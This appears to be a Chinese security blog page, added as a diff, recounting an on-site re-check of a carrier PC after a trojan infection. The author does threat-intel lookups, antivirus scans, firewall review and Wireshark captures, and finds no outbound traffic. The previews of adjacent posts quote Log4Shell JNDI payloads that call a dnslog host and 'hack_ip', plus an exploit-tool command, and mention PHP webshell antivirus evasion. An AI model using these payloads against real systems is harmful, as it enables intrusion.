@@ -1,0 +1,166 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>上门复测某运营商的中毒处置 | lan1ocのblog</title><meta name="author" content="lan1oc"><meta name="copyright" content="lan1oc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息收集通报里有外联ip，然后对着ip去威胁情报上面搜了下 1154.84.62.140 找到了相关样本然后看了下两个样本的分析1.zip会产生如下文件，并有相应行为ServerBB.exe直接运行就是回连恶意ip 排查既没有安全设备，也没有日志，毕竟是个人办公电脑，然后之前现场的技术工程师跟我说，用360查杀了一遍，那也就是说，连马子叫啥都不知道从360那里看了，也没有查杀记录，说是没用，然后刚">
+<meta property="og:type" content="article">
+<meta property="og:title" content="上门复测某运营商的中毒处置">
+<meta property="og:url" content="http://lan1oc.co/2025/07/28/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E5%A4%84%E7%BD%AE%E5%90%8E%E7%9A%84%E5%A4%8D%E6%B5%8B/%E4%B8%AD%E7%A7%BB%E9%93%81%E9%80%9A/index.html">
+<meta property="og:site_name" content="lan1ocのblog">
+<meta property="og:description" content="信息收集通报里有外联ip，然后对着ip去威胁情报上面搜了下 1154.84.62.140 找到了相关样本然后看了下两个样本的分析1.zip会产生如下文件，并有相应行为ServerBB.exe直接运行就是回连恶意ip 排查既没有安全设备，也没有日志，毕竟是个人办公电脑，然后之前现场的技术工程师跟我说，用360查杀了一遍，那也就是说，连马子叫啥都不知道从360那里看了，也没有查杀记录，说是没用，然后刚">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://lan1oc.co/img/cover/2.webp">
+<meta property="article:published_time" content="2025-07-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-27T16:00:00.000Z">
+<meta property="article:author" content="lan1oc">
+<meta property="article:tag" content="干中学">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://lan1oc.co/img/cover/2.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "上门复测某运营商的中毒处置",
+  "url": "http://lan1oc.co/2025/07/28/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E5%A4%84%E7%BD%AE%E5%90%8E%E7%9A%84%E5%A4%8D%E6%B5%8B/%E4%B8%AD%E7%A7%BB%E9%93%81%E9%80%9A/",
+  "image": "http://lan1oc.co/img/cover/2.webp",
+  "datePublished": "2025-07-27T16:00:00.000Z",
+  "dateModified": "2025-07-27T16:00:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "lan1oc",
+      "url": "http://lan1oc.co/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/1.ico"><link rel="canonical" href="http://lan1oc.co/2025/07/28/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E5%A4%84%E7%BD%AE%E5%90%8E%E7%9A%84%E5%A4%8D%E6%B5%8B/%E4%B8%AD%E7%A7%BB%E9%93%81%E9%80%9A/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '上门复测某运营商的中毒处置',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/4.webp);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover/2.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">lan1ocのblog</span></a><a class="nav-page-title" href="/"><span class="site-name">上门复测某运营商的中毒处置</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">上门复测某运营商的中毒处置</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-27T16:00:00.000Z" title="发表于 2025-07-28 00:00:00">2025-07-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-27T16:00:00.000Z" title="更新于 2025-07-28 00:00:00">2025-07-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B7%A5%E4%BD%9C/">工作</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>通报里有外联ip，然后对着ip去威胁情报上面搜了下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">154.84.62.140</span><br></pre></td></tr></table></figure>
+<p><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/Pasted%20image%2020250729104446.png"><br>找到了相关样本<br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/Pasted%20image%2020250729104642.png"><br>然后看了下两个样本的分析<br><code>1.zip</code>会产生如下文件，并有相应行为<br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/Pasted%20image%2020250729104904.png"><br><code>ServerBB.exe</code>直接运行就是回连恶意ip<br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/Pasted%20image%2020250729105006.png"><br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/Pasted%20image%2020250729105016.png"></p>
+<h1 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h1><p>既没有安全设备，也没有日志，毕竟是个人办公电脑，然后之前现场的技术工程师跟我说，用360查杀了一遍，那也就是说，连马子叫啥都不知道<br>从360那里看了，也没有查杀记录，说是没用，然后刚刚重下的，嗯，我又查杀了一遍，确实没用，查杀完直接卡死。。。。。只能说，<code>uos</code>系统牛逼<br>那没法了，好像只有个自带的杀软能用，看了下引擎还是恒子的<br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/0ca29055ba71427344538f82dbb7c054.jpg"><br>那就一顿扫呗，现场的技术工程师说有开防火墙，本就是复测嘛，就是看看到底解决没有，想着先看看防火墙日志，结果tmd加了规则，开了，但是如开，因为没有设置开机自启，那。。。。。我说怎么之前搜日志，都显示文件不存在，然后就是帮他开下<br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/59c2f1dcd752fa6f11ce68924cc70eb2.jpg"><br>那只能排查下进程和文件，没办法，只能对着威胁情报来查了<br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/b4c5fdb2583bd3e3981d2c5ff9d0ee48.jpg"><br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/904ba7840e973990220e4b0b3246f94c.jpg"><br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/9e75dac110f584d95c5bbf6ab9d949c2.jpg"><br>看到本来就有装个<code>wireshark</code>，那就对着有流量的四个网口抓包看看，然后通过过滤规则看看，主要就是看看有没有外联<br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/8c57775cab3eed828264ad18f6edbdb4.jpg"><br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/6df6172819a785935e7debbc8f36561f.jpg"><br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/4d7afe9a68e14326d20d6d63f65cf6f1.jpg"><br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/620281d431614c469117b443e3b505ab.jpg"><br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/d8aba6f17b92af26855d695fcc2ba830.jpg"><br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/6902a941c67c65f84fced200bc92992d.jpg"><br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/96152d9f70da784fb82082e7ef1d160f.jpg"><br>啥都没有啊，然后同事也去验证了是否是有网络隔离，也确认了<br>接着就是等扫描结果，嗯确实没东西，应该安全吧<br><img src="/../../../../images/%E5%A4%8D%E6%B5%8B/92e786d5d49a76a4bb8933be6cb51de6.jpg"></p>
+<h1 id="安全，肥肠安全"><a href="#安全，肥肠安全" class="headerlink" title="安全，肥肠安全"></a>安全，肥肠安全</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://lan1oc.co">lan1oc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://lan1oc.co/2025/07/28/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E5%A4%84%E7%BD%AE%E5%90%8E%E7%9A%84%E5%A4%8D%E6%B5%8B/%E4%B8%AD%E7%A7%BB%E9%93%81%E9%80%9A/">http://lan1oc.co/2025/07/28/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E5%A4%84%E7%BD%AE%E5%90%8E%E7%9A%84%E5%A4%8D%E6%B5%8B/%E4%B8%AD%E7%A7%BB%E9%93%81%E9%80%9A/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://lan1oc.co" target="_blank">lan1ocのblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%B9%B2%E4%B8%AD%E5%AD%A6/">干中学</a></div><div class="post-share"><div class="social-share" data-image="/img/cover/2.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/27/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/%E5%85%8D%E6%9D%80/php/%E6%97%A0%E5%AD%97%E6%AF%8D%E4%BB%A5%E5%8F%8A%E9%83%A8%E5%88%86%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/" title="[瞎琢磨]php免杀研究1"><img class="cover" src="/img/cover/4.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">[瞎琢磨]php免杀研究1</div></div><div class="info-2"><div class="info-item-1">想到啥说啥感觉手上的马子太少了，至今还在是用一句话木马，这遇到杀软什么的包死的，想到之前打ctf的时候，做过些极限rce的题目，可以搬来用用，那就基于ctfshow的那几道极限rce的题目研究一下 以数字替换字母构造函数的混淆法限制条件1禁止 了以下字符：  字母： b-z （小写b到z）、 A-Z （大写A到Z） 特殊符号： _ 、 @ 、 # 、 % 、 ^ 、 &amp; 、 * 、 : 、 {} 、 - 、 + 、 &lt;&gt; 、 “ 、 | 、` 、 ; 、 [ 、 ]  操作空间目测字母只有a可用，然后数字能用嗯，想了下发现$和?也能用，那么操作空间来了可以用通配符加数字来比对文件执行：/???/????64...</div></div></div></a><a class="pagination-related" href="/2025/08/05/%E5%B7%A5%E4%BD%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%88%9F%E5%B1%B1%E6%95%B0%E6%8D%AE%E5%B1%80/1/" title="某市hw记录"><img class="cover" src="/img/c1/4.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">某市hw记录</div></div><div class="info-2"><div class="info-item-1">getshelllog4j（实战中第一次遇到）开局一个spring boot的默认错误页面扫目录就出了个接口文档，但是类似后台入口啥的都没找到想着碰运气吧，结果，spring boot scan也没结果，那脚本小子没辙了，然后就是让ai帮我拓宽思路（确实经验不足，唉）然后ai说可能：Java应用通常有一些共性行为，可以推断是否可能使用Log4j想着就打打log4j吧 1234GET /error/ HTTP/1.1Host: Accept: $&#123;jndi:rmi://la446n.dnslog.cn/1&#125;Cache-Control: max-age=0 直接dnslog打批量看看，有访问记录  换工具验证 1$&#123;jndi:ldap://hack_ip:ldap_port/URLDNS/cllacu.dnslog.cn/1&#125; 1java -jar jndi-exp.jar -i hack_ip -l ldap_port -p...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/14/%E8%AE%B0%E5%BD%95/%E8%87%AA%E7%A0%94/%E5%A4%87%E6%A1%88%E5%BD%92%E9%9B%86%E4%BB%A5%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%B9%B6%E5%A1%AB%E5%85%85%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%88%E9%80%82%E9%85%8D%E5%AE%89%E6%81%92%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0%EF%BC%89/%E5%B7%A5%E5%85%B7%E7%AE%80%E4%BB%8B/" title="备案归集以及数据处理并填充的工具（适配安恒指挥调度平台）"><img class="cover" src="/img/c1/2.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-14</div><div class="info-item-2">备案归集以及数据处理并填充的工具（适配安恒指挥调度平台）</div></div><div class="info-2"><div class="info-item-1">备案归集的工具源码 核心功能1. 批量域名备案信息归集 从 CSV 文件（OneForAll 输出格式）读取子域名信息 查询每个子域名的 ICP 备案信息 归集同主域名下的所有子域名、IP、端口等信息  2. 企业名称识别 备案信息优先：优先使用 ICP 备案中的企业名称 主域名备案查询：子域名无备案时，查询主域名备案  3. 系统类型简单识别 邮箱或通信系统：检测邮件、SMTP、IMAP 等关键词 门户网站：检测官网、产品、新闻等关键词 应用系统：检测...</div></div></div></a><a class="pagination-related" href="/2025/07/09/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E5%AE%81%E6%B3%A2%E6%95%B0%E7%9B%8A%E5%B7%A5%E8%81%94%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E7%AC%AC%E4%B8%80%E6%AC%A1app%E6%BC%8F%E6%B4%9E%E5%A4%8D%E6%B5%8B/" title="第一次app漏洞复测"><img class="cover" src="/img/c1/2.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-09</div><div class="info-item-2">第一次app漏洞复测</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2025/07/25/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E6%8C%82%E9%A9%AC%E5%A4%8D%E6%B5%8B%EF%BC%88md%E5%B0%B1%E6%98%AF%E6%B8%97%E9%80%8F%EF%BC%89/%E7%9C%9F%E7%9A%84%E4%B8%8D%E7%9F%A5%E9%81%93%E9%A9%AC%E5%9C%A8%E5%93%AA%E5%95%8A/" title="真的不知道怎么被挂马的啊"><img class="cover" src="/img/c1/3.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-25</div><div class="info-item-2">真的不知道怎么被挂马的啊</div></div><div class="info-2"><div class="info-item-1">指纹主站：PHP/5.2.17p1、ThinkPHP 3.1.38080端口有个wdcp 扫目录wdcp扫出点东西 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566[14:59:33] Starting: [14:59:37] 301 -  239B  - /js  -&gt;  /js/[14:59:48] 403 -  213B  - /.ht_wsr.txt[14:59:48] 403 -  216B  - /.htaccess.bak1[14:59:48] 403 -  216B  - /.htaccess.save[14:59:48] 403 -  214B  - /.htaccess_sc[14:59:48] 403 -  217B  - /.htaccess_extra[14:59:48] 403 -  216B  - /.htaccess.orig[14:59:48]...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/joker.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">lan1oc</div><div class="author-info-description">57qv6I+c54uX572i5LqG</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">84</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lan1oc"><i class="fab fa-github"></i><span>没啥用的仓库</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">随便写写</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5"><span class="toc-number">2.</span> <span class="toc-text">排查</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%EF%BC%8C%E8%82%A5%E8%82%A0%E5%AE%89%E5%85%A8"><span class="toc-number">3.</span> <span class="toc-text">安全，肥肠安全</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/08/13/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E8%8B%A5%E4%BE%9D/1/" title="ruoyi-vue的一次渗透"><img src="/img/cover/4.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ruoyi-vue的一次渗透"/></a><div class="content"><a class="title" href="/2025/08/13/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E8%8B%A5%E4%BE%9D/1/" title="ruoyi-vue的一次渗透">ruoyi-vue的一次渗透</a><time datetime="2025-08-12T16:00:00.000Z" title="发表于 2025-08-13 00:00:00">2025-08-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/06/%E8%AE%B0%E5%BD%95/day/bc%E7%BD%91%E7%AB%99/sql%E6%B3%A8%E5%85%A5/" title="黑产day，也没验证成功，纯当记录"><img src="/img/c1/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="黑产day，也没验证成功，纯当记录"/></a><div class="content"><a class="title" href="/2025/08/06/%E8%AE%B0%E5%BD%95/day/bc%E7%BD%91%E7%AB%99/sql%E6%B3%A8%E5%85%A5/" title="黑产day，也没验证成功，纯当记录">黑产day，也没验证成功，纯当记录</a><time datetime="2025-08-05T16:00:00.000Z" title="发表于 2025-08-06 00:00:00">2025-08-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/05/%E5%B7%A5%E4%BD%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%88%9F%E5%B1%B1%E6%95%B0%E6%8D%AE%E5%B1%80/1/" title="某市hw记录"><img src="/img/c1/4.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某市hw记录"/></a><div class="content"><a class="title" href="/2025/08/05/%E5%B7%A5%E4%BD%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%88%9F%E5%B1%B1%E6%95%B0%E6%8D%AE%E5%B1%80/1/" title="某市hw记录">某市hw记录</a><time datetime="2025-08-04T16:00:00.000Z" title="发表于 2025-08-05 00:00:00">2025-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/28/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E5%A4%84%E7%BD%AE%E5%90%8E%E7%9A%84%E5%A4%8D%E6%B5%8B/%E4%B8%AD%E7%A7%BB%E9%93%81%E9%80%9A/" title="上门复测某运营商的中毒处置"><img src="/img/cover/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="上门复测某运营商的中毒处置"/></a><div class="content"><a class="title" href="/2025/07/28/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E5%A4%84%E7%BD%AE%E5%90%8E%E7%9A%84%E5%A4%8D%E6%B5%8B/%E4%B8%AD%E7%A7%BB%E9%93%81%E9%80%9A/" title="上门复测某运营商的中毒处置">上门复测某运营商的中毒处置</a><time datetime="2025-07-27T16:00:00.000Z" title="发表于 2025-07-28 00:00:00">2025-07-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/27/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/%E5%85%8D%E6%9D%80/php/%E6%97%A0%E5%AD%97%E6%AF%8D%E4%BB%A5%E5%8F%8A%E9%83%A8%E5%88%86%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/" title="[瞎琢磨]php免杀研究1"><img src="/img/cover/4.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[瞎琢磨]php免杀研究1"/></a><div class="content"><a class="title" href="/2025/07/27/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/%E5%85%8D%E6%9D%80/php/%E6%97%A0%E5%AD%97%E6%AF%8D%E4%BB%A5%E5%8F%8A%E9%83%A8%E5%88%86%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/" title="[瞎琢磨]php免杀研究1">[瞎琢磨]php免杀研究1</a><time datetime="2025-07-26T16:00:00.000Z" title="发表于 2025-07-27 00:00:00">2025-07-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/5.webp);"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By lan1oc</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
